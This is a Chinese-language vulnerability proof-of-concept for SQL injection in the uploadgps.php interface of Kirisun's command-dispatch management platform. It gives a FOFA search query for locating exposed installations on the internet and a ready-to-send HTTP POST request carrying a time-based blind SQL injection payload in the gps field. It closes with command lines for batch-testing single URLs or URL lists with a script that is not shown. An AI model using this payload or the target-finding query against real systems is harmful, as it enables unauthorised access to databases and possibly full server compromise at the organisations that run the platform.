# 指挥调度管理平台uploadgps.php存在SQL注入

### 1.漏洞描述

### 1.漏洞描述

科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。该产品旨在提供高效的指挥调度和管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。其uploadgps接口存在sql注入，恶意攻击者可能会向数据库发送构造的恶意SQL查询语句，以获取数据库敏感信息、修改数据或者执行其他恶意操作，还有可能直接通过sql注入获取服务器权限。

### 2.fofa语法

```plain
body="指挥调度管理平台"
```

### 3.漏洞复现

```plain
POST /api/client/task/uploadgps.php HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 83

uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(4)))ozYR)+AND+'fqDZ'='fqDZ&number=
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719922442029-51f3af5a-c725-424f-aed7-bcb0d6ef4760.png)

### 4.py脚本

```plain
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```